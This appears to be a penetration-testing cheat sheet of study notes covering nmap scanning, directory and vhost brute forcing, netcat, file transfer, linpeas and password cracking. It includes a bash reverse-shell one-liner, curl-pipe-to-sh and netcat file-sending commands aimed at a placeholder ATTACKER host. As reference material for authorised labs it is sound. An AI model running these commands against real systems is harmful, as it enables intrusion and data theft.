# Common commands

🇹🇷 [Türkçe](common-commands.tr.md)

Study notes. Replace `TARGET` / `ATTACKER` with the real IPs. Use only on authorised targets.
Wordlist paths below are those of Kali; they differ on other systems.

## nmap

```bash
nmap -p- --min-rate 1000 -oA nmap/allports TARGET     # all TCP ports, fast
nmap -sC -sV -p 22,80 -oA nmap/targeted TARGET        # default scripts + versions on open ports
nmap -Pn TARGET                                       # skip host discovery (host blocks ping)
nmap -sU --top-ports 20 TARGET                        # UDP, top 20 (slow, needs root)
nmap --script vuln -p 80 TARGET                       # NSE vulnerability scripts (noisy)
```

`-oA` writes normal, grepable and XML output. `-sS` (SYN scan) is the default when run as root.

## Directory / vhost brute force

```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 30
gobuster vhost -u http://example.test -w subdomains.txt --append-domain   # gobuster >= 3.6

ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt -fc 404
ffuf -u http://TARGET/ -H "Host: FUZZ.example.test" -w subdomains.txt -fs 1234   # filter by size
ffuf -u 'http://TARGET/page?FUZZ=1' -w params.txt -fs 1234                       # parameter names
```

`-fc` filters status codes, `-fs` filters response size. Find the "normal" size first, then filter it out.

## netcat and shells

```bash
nc -lvnp 4444                       # listener on ATTACKER (-l listen, -v verbose, -n no DNS, -p port)
nc -vz TARGET 80                    # is the port open?

# reverse shell one-liner to run on the target (bash)
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```

Stabilise a shell on the target after the connection arrives:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# press Ctrl+Z to background it, then on your own machine:
stty raw -echo; fg
# back in the shell:
export TERM=xterm
```

## Simple web server (to serve files to the target)

```bash
python3 -m http.server 8000                    # serves the current directory on all interfaces
python3 -m http.server 8000 --bind ATTACKER    # only on one interface (e.g. the VPN address)
```

## File transfer

```bash
# target downloads from ATTACKER's http.server
wget http://ATTACKER:8000/file -O /tmp/file
curl http://ATTACKER:8000/file -o /tmp/file

# netcat: receiver first, then sender
nc -lvnp 9001 > file            # receiver
nc ATTACKER 9001 < file         # sender (add -q 1 / -N if it hangs, depends on the netcat variant)

# scp (needs SSH access)
scp user@TARGET:/path/file .

# no tools at all: base64 through the terminal, then decode
base64 -w0 file                 # copy the output
echo 'PASTE' | base64 -d > file

# verify integrity
sha256sum file
```

Windows target (PowerShell / cmd):

```powershell
Invoke-WebRequest -Uri http://ATTACKER:8000/file -OutFile C:\Windows\Temp\file
certutil -urlcache -split -f http://ATTACKER:8000/file file
```

## linpeas (Linux enumeration script)

```bash
# on ATTACKER: download once, then serve it
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8000

# on TARGET: run it without writing to disk, or save the output for later reading
curl http://ATTACKER:8000/linpeas.sh | sh
# or
curl http://ATTACKER:8000/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.out
```

Read the red/yellow findings first, then verify each one by hand. The script only points at
things; understanding them is your job.

## Cracking and misc

```bash
searchsploit apache 2.4.49              # offline Exploit-DB search
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt   # -m 0 = MD5; find the mode in `hashcat --help`
ssh -i id_rsa user@TARGET               # key file must be chmod 600
ssh -L 8080:127.0.0.1:80 user@TARGET    # forward local 8080 to the target's local port 80
```
